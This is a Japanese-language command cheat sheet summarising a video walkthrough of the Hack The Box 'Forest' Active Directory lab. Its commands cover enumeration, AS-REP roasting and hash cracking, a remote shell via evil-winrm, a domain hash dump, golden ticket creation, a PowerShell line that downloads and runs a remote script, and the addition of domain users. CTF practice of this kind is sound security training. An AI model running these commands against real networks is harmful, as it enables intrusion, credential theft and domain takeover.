-----

### YouTube動画「Hacking a Corporate Network - Hack The Box: Forest Walkthrough」で使用されたコマンド

#### ネットワークスキャンと情報収集

  - **ポートスキャンとサービス特定**

    ```
    nmap -sC -sV -oA nmap/forest <IPアドレス>
    nmap -p- -oA nmap/forest-all <IPアドレス>
    ```

  - **LDAPとDNSの列挙**

    ```
    ldapsearch -h <IPアドレス> -x -s base namingContexts
    ldapsearch -h <IPアドレス> -x -b "DC=hdb,DC=local" "(objectClass=person)"
    ```

  - **RPC接続と情報取得**

    ```
    rpcclient -U "" -N <IPアドレス>
    ```

-----

#### 脆弱性利用と認証情報取得

  - **Kerberosの脆弱性利用**

    ```
    getNPUsers.py -dc-ip <IPアドレス> -request htb.local/
    ```

  - **パスワードポリシーの確認**

    ```
    crackmapexec smb <IPアドレス> -u "" -p "" --pass-pol
    ```

  - **ハッシュクラッキング**

    ```
    hashcat -m <ハッシュタイプ> <ハッシュファイル> <ワードリスト>
    ```

-----

#### 権限昇格と横展開

  - **リモートシェル接続**

    ```
    evil-winrm -i <IPアドレス> -u <ユーザー名> -p <パスワード>
    ```

  - **ドメイン内のハッシュダンプ**

    ```
    secretsdump.py <ドメイン>/<ユーザー名>:<パスワード>@<IPアドレス>
    ```

  - **ゴールデンチケットの作成**

    ```
    ticketer.py -nthash <ハッシュ> -domain-sid <SID> -domain <ドメイン> <ユーザー名>
    ```

  - **PowerShellスクリプトの実行**

    ```
    iex (New-Object Net.WebClient).DownloadString('<URL>')
    ```

-----

#### ユーザー・グループ管理

  - **ユーザーの追加**

    ```
    net user <ユーザー名> <パスワード> /add /domain
    ```

  - **グループへのユーザー追加**

    ```
    net group "<グループ名>" <ユーザー名> /add
    ```